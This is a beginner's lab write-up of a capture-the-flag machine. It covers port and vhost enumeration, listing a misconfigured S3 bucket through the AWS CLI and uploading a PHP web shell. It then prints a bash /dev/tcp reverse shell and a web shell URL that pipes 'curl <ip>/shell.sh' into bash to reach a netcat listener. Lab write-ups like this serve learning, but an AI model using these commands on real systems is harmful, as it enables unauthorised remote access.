# Sequel

![](Misc/three_pwnd.PNG)

This is my sixth machine when learning the basics of penetration testing. Tags included in this machine are:

- Linux

## <ins>**Questions**

* [Questions 1-3](Misc/questions_1.PNG)
* [Questions 4-6](Misc/questions_2.PNG)
* [Questions 7-9](Misc/questions_3.PNG)

## <ins>**Web server enumeration**

For this machine you need to do port scanning, enumerate the web server and the subdomain, interact with the AWS services and finally get the flag by web shells and reverse shells.

#### **Nmap**

![](Misc/nmap.PNG)

A couple of notes about the flags. 

~~~
sudo nmap -SCV -p- -T4 -Pn --open -O <ip address>
~~~

- **-sC** runs scripts for additional info
- **-V** increases the verbosity level, causing Nmap to print more information about the scan in progress
- **-p-** scan the whole range (excluding zero)
- **T4** is how fast and accurate the port scan is. T0 is very slow and T5 is very fast
- **-Pn** tells Nmap to skip the ping test and simply scan every target host provided.
- **--open** shows hosts that have open ports, and only show the open ports for those. Here, “open ports” are any ports that have the possibility of being open, which includes open, open|filtered, and unfiltered.
- **-O** operating system discovery
- ip address is the target that we are scanning with nmap

As a result we found the open ports on this machine. On port 80 we notice the version of Apache and a reference to the name of the web page. We may need this information as we progress with the machine.

#### **Gobuster**

Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains. Let us see if we can get some information out with this tool.

~~~
gobuster dir -u <ip address> -w /usr/share/wordlists/wfuzz/general/big.txt
~~~

![](Misc/gobuster.PNG)

Note that **dir** is a directory brute forcing mode. **-u** is the target url flag and **-w** is a wordlist of directory names. We are using a default wordlist found in **wfuzz**.

#### **Website**

Next we look at the ip address in the browser. We find the website and start looking for different tabs and such for ways to get more possibilities to hack the machine.

![](Misc/website.PNG)

![](Misc/subdomain.PNG)

In the contact information we find out the subdomain that the webpage has (thetoppers). With that information, we not only got the answer to the task, but we can also use that information to try enumerate the subdomain. First lets add the ip address and subdomain to the /etc/hosts/.

![](Misc/hosts.PNG)

Keep in mind that the ip address of thetoppers.htb changes because I didn't complete the whole machine in one sitting.

![](Misc/images.PNG)

Next we take a look to the /images that we found from the scan. Unfortunately there was no any useful information that we could use so let us proceed with the machine.

## <ins>**Subdomain enumeration**

Subdomain enumeration is the process of identifying all subdomains for a given domain. In this case we only get thetoppers.htb with the ip address but we are trying to find out if we can find more subdomains for that site. This technology is called **virtual hosting** or vhost for short. We use **gobuster** tool in this situation.

Note that **vhost** flag is for finding the subdomains, **--append-domain** is to append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist. **-w** is a wordlist that we are using.

Note that in the new version of Kali (or AWS I'm not 100% sure which one it is) the syntax is a little bit different to get the S3 with the vhost. Also keep that in mind that you need to install both the gobuster and seclist to use them in this following code.

~~~
gobuster vhost --append-domain -u <subdomain address> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
~~~

![](Misc/vhost.PNG)

With the search we find out two results and the first one is the one we are looking for. In short S3 is AWS cloud service for storaging (https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html). The only problem is that it is commonly misconfigured and thus leading to security promblems. Now we add this subdomain (s3.thetoppers.htb) to the /etc/hosts next to the previous subdomain. 

## <ins>**AWS Services**

We can try to configure AWS with some data that has no sense in any way. That way we can get access to the AWS so that we can possibly get some valuable data out of the buckets.

#### **S3 buckets**

Now we should be able to interact with the list of s3 buckets that the service is holding. Let us see if we can list the s3 buckets with following command.

~~~
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
~~~

![](Misc/aws_configure.PNG)

Okay so we got a bucket. Now we want to expand command and list the actual content(s) of the s3 bucket.

~~~
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
~~~

![](Misc/aws_endpoint.PNG)


#### **Setting up the listeners**

Now we need some listeners in order to get web shells. Because the scripting language is php we use the same language for getting some data when we interact with the ip address.

![](Misc/php.PNG)

Now we want to copy that shell.php to the s3 bucket so we can issue some operating system commands and possibly get some data from the listener (shell.php). Let us try to use some commands in the browser.

![](Misc/id.PNG)

![](Misc/thetoppers.PNG)

Seems to work fine. Now let us use [revshells.com](https://www.revshells.com) to get reverse shell with the help of this website. We define the port (443) and the reverse method (Bash -i) we want to use.

Notice that before we can use it we have to see the tun0 address of our own (virtual) machine and use the address in the following command.

![](Misc/tun0.PNG)

~~~
echo 'sh -i >& /dev/tcp/<tun0 ip address>/<port> 0>&1' > shell.sh
~~~

Next we need to set up a netcat listener with the following command.

~~~
sudo nc -lvnp <port>

-l for listening mode
-v for verbose output
-n for no DNS resolutions
-p for specified port
~~~

![](Misc/listener.PNG)

Now we want to echo the contents of the reverse inside the single quatitation and we write it in the bash script named shell.sh in our case. 

![](Misc/shell.PNG)

## <ins>**Web shells & Reverse shells**

![](Misc/aws_endpoint_2.PNG)

After that we want to start a web server where we can write our script to. For that we use python3 script in the following way. The port we are using is 8080.

![](Misc/server.PNG)

Now we have a listener set up that catches our reverse shell and we also have server that is serving our reverse shell script. After this we head to the browser and issue a curl command to make a request to ip address over http and into a bash. That way it will reach out, grab the reverse shell script and reverse shell is going to send the shell to our netcat listener so that we can get the access to the machine. The culr looks like the following:

~~~
thetoppers.htb/shell.php?cmd=curl%2010.10.15.108:443/shell.sh|bash 

thetoppers.htb/shell.php?cmd=curl%20<tun0 ip address>:<port>/<name of the reverse shell script>|<output command> 
~~~

Now we return to the netcat listener and should be able to see the same output as we did on the browser. We can now put the linux commands to navigate and get some information.

As we can see I have tried some commands like id, whoami, ls, pwd. After that I've gone back in the directory structure and got the flag.txt. After that I read it with cat command and there we have the flag. Nice!

![](Misc/flag.PNG)

And there we have the flag. Now can submit it and move on to the next machine. Hurray!